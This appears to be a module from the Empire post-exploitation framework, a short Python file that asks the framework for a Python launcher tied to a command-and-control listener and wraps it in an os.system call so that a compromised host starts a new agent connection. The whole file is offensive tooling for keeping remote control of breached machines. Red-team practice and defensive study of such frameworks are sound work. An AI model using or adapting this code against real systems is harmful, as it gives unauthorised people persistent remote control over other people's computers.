from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # extract all of our options
        listener_name = params['Listener']
        user_agent = params['UserAgent']

        # generate the launcher code
        launcher = main_menu.stagers.generate_launcher(listener_name, language='python', userAgent=user_agent)

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:

            launcher = launcher.replace('"', '\\"')
            script = 'os.system("%s")' % (launcher)

            return script
